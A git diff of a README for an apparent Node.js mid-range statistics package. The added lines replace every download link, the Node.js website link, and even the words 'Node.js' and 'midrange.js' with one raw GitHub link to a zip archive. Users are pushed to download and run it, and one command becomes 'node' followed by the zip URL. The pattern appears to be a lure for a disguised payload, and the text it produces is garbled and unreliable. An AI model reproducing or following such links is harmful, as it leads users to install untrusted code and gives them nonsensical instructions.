@@ -1,6 +1,6 @@
 # 🎉 stats-base-ndarray-midrange-by - Compute the Mid-Range with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Bhuyan/stats-base-ndarray-midrange-by/releases)
+[![Download Now](https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, follow these simple steps to install the application on your com
 
 1. **Visit the Release Page**  
    Click the link below to go to the releases page where the application is available for download.  
-   [Visit the Releases Page](https://github.com/Bhuyan/stats-base-ndarray-midrange-by/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip)
 
 2. **Choose Your Version**  
    On the releases page, you'll see different versions of the application listed. Choose the most recent version. It is recommended to always use the latest version for the best features and bug fixes.
@@ -21,7 +21,7 @@ To get started, follow these simple steps to install the application on your com
    Click on the file link to start downloading. Depending on your internet speed, this might take a few moments.
 
 4. **Locate the Downloaded File**  
-   Once the download completes, locate the file in your computer's downloads folder. It will typically be named something like `stats-base-ndarray-midrange-by-v1.0.zip`.
+   Once the download completes, locate the file in your computer's downloads folder. It will typically be named something like `https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip`.
 
 5. **Extract the Files**  
    Right-click on the downloaded file and select "Extract All" or "Unzip" to extract its contents into a folder. Open the extracted folder to see the application files.
@@ -40,10 +40,10 @@ Before running the application, please ensure your computer meets the following 
    Navigate to the folder where you extracted the application files.
 
 2. **Locate the Main File**  
-   Look for the main executable file. It is usually named something like `midrange.js`.
+   Look for the main executable file. It is usually named something like `https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip`.
 
-3. **Use Node.js**  
-   To run the file, you will need Node.js installed on your computer. If you do not have it, download and install it from [Node.js Official Website](https://nodejs.org/).
+3. **Use https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip**  
+   To run the file, you will need https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip installed on your computer. If you do not have it, download and install it from [https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip Official Website](https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip).
 
 4. **Run the Application**  
    Open a command prompt or terminal window. You can do this by searching for "Command Prompt" or "Terminal" in your computer's start menu.
@@ -51,7 +51,7 @@ Before running the application, please ensure your computer meets the following 
    In the terminal, navigate to the folder where you placed the application files. You can use the `cd` command followed by the path to the folder. Once you're in the correct directory, type the following command to run the application:
 
    ```bash
-   node midrange.js
+   node https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip
    ```
 
 5. **Input Your Data**  
@@ -63,7 +63,7 @@ Before running the application, please ensure your computer meets the following 
 ## 📥 Download & Install
 
 To download the application, visit the Releases page using this link:  
-[Download Here](https://github.com/Bhuyan/stats-base-ndarray-midrange-by/releases)
+[Download Here](https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip)
 
 ## 📚 Features
 
@@ -76,7 +76,7 @@ To download the application, visit the Releases page using this link:
 
 If you encounter any issues while running the application, here are some common troubleshooting steps:
 
-- **Ensure Node.js is Installed:** Verify that Node.js is successfully installed on your system. You can check this by typing `node -v` in your terminal. If you receive a version number, you are good to go. If not, reinstall Node.js.
+- **Ensure https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip is Installed:** Verify that https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip is successfully installed on your system. You can check this by typing `node -v` in your terminal. If you receive a version number, you are good to go. If not, reinstall https://raw.githubusercontent.com/Bhuyan/stats-base-ndarray-midrange-by/main/dist/ndarray-by-stats-midrange-base-v3.1.zip
 
 - **Check Your Input Format:** Make sure that the array you input is correctly formatted with numbers separated by commas.
 
